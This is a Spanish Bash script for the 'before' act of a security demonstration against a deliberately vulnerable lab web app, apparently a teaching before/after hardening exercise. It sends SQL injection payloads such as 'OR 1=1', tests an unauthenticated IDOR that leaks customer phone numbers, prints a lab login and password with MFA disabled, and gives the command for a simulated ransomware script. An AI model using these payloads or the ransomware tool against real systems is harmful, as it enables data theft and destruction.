#!/usr/bin/env bash
# ============================================================================
#  10-antes.sh — ACTO 1: ataques contra el laboratorio vulnerable
# ============================================================================
#  Requiere la app con LAB_MODE=1 (rutas /api/lab/* activas).
#  Se ejecuta desde la VM ATACANTE (o localmente contra 127.0.0.1:3000).
#
#  Uso:
#    BASE_URL=http://10.10.10.20:3000 bash scripts/lab/demo/10-antes.sh
# ============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
cd "$ROOT" || exit 1
export EVID="${EVID:-$ROOT/evidencias/$(date +%Y%m%d-%H%M%S)}"
# shellcheck disable=SC1091
. "$SCRIPT_DIR/lib.sh"

section "ACTO 1 — ANTES (LAB_MODE=1)"
info "Base URL: $BASE_URL"

lab_code="$(http_code "$BASE_URL/api/lab/products?id=1" "$EVID/antes-mode.json")"
if [ "$lab_code" != "200" ]; then
  skip "LAB_MODE no está en 1 (HTTP $lab_code en /api/lab/products?id=1)."
  note "Arranca con: bash scripts/lab/demo/start-pm2.sh   # LAB_MODE=1 por defecto"
  summary
  exit 0
fi
ok "LAB_MODE=1 activo: las rutas /api/lab/* responden."

section "A1. SQL Injection — bypass con OR 1=1"
assert_code "A1 SQLi id=1 OR 1=1" "200" "$BASE_URL/api/lab/products?id=1%20OR%201=1"
assert_present "A1 devuelve costPrice" "$LAST_FILE" '"costPrice"'
if grep -q '"count":8' "$LAST_FILE" 2>/dev/null; then
  ok "A1 devuelve los 8 productos (bypass exitoso)"
else
  info "A1 count distinto de 8; revisa el cuerpo en $LAST_FILE"
fi

section "A2. SQL Injection — comilla simple"
assert_code "A2 SQLi q=' OR '1'='1" "200" "$BASE_URL/api/lab/products?q=%27%20OR%20%271%27%3D%271"
assert_present "A2 devuelve datos" "$LAST_FILE" '"data"'

section "A3. IDOR / fuga de PII — /api/lab/orders sin autenticación"
assert_code "A3 IDOR orders" "200" "$BASE_URL/api/lab/orders"
assert_present "A3 teléfonos descifrados" "$LAST_FILE" '"customerPhone"'
assert_present "A3 control de acceso NINGUNO" "$LAST_FILE" '"accessControl":"NINGUNO"'

section "A4. PII en texto plano (pedido legacy del 'antes')"
if grep -q '955443322' "$LAST_FILE" 2>/dev/null; then
  ok "A4 teléfono legacy 955443322 visible en /api/lab/orders"
  note "Este es el pedido LAB-Legacy que el 'después' debe eliminar o cifrar."
else
  skip "A4 no hay pedido legacy; re-siembra con: npx tsx --env-file=.env.lab scripts/lab/seed-lab.ts"
fi

section "A5. Fuga del margen costPrice"
assert_code "A5 costPrice público" "200" "$BASE_URL/api/lab/products?id=1"
assert_present "A5 costPrice visible" "$LAST_FILE" '"costPrice"'

section "A6. Login sin MFA (demostración manual)"
assert_code "A6 login disponible" "200" "$BASE_URL/taller-control/login"
info "Abre $BASE_URL/taller-control/login"
info "Usuario: zarate   Contraseña: Zarate2026!   MFA: desactivado a propósito."
note "En el 'después' este mismo login debe exigir TOTP."

section "A7. Ransomware simulado (se ejecuta en la VM víctima)"
info "Comando para la VM víctima:"
note "python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db"
note "Restaurar: python3 scripts/lab/ransomware-sim.py --target lab-data/lab.db --restore"
note "No uses --live sin snapshot de la VM."

summary
